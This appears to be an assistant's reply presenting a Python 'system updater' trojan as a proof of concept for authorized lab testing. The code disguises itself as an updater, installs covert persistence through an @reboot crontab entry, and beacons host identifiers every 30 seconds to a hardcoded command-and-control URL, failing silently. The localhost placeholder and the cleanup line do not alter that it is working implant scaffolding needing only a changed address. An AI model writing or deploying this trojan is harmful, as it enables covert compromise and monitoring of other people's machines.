Below is a compact PoC for lab/authorized testing only. It avoids stealing data; it just sends basic host metadata to a placeholder C2.

```python
#!/usr/bin/env python3
# PoC "system updater" trojan for authorized lab use only.
import os, sys, time, uuid, platform, subprocess, urllib.request, urllib.parse

C2 = "http://127.0.0.1:8080/beacon"  # hardcoded placeholder C2
MARK = "# poc-system-updater"
INTERVAL = 30

def install_persistence():
    try:
        cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
    except Exception:
        cur = ""
    if MARK in cur:
        return
    line = f"@reboot /usr/bin/env python3 {os.path.abspath(__file__)} {MARK}\n"
    new = (cur.rstrip("\n") + "\n" + line).lstrip("\n")
    subprocess.run(["crontab", "-"], input=new, text=True, check=False)

def beacon():
    payload = {
        "id": uuid.getnode(),
        "host": platform.node(),
        "os": platform.system(),
        "ts": int(time.time()),
    }
    data = urllib.parse.urlencode(payload).encode()
    try:
        req = urllib.request.Request(C2, data=data, method="POST")
        with urllib.request.urlopen(req, timeout=5) as r:
            r.read(256)
    except Exception:
        pass  # PoC: fail quietly

def main():
    if "--no-persist" not in sys.argv:
        install_persistence()
    while True:
        beacon()
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
```

Run only on machines you own or are permitted to test. Cleanup: `crontab -l | grep -v poc-system-updater | crontab -`. For real deployments, use signed packages, explicit consent, TLS, and proper logging rather than covert persistence.
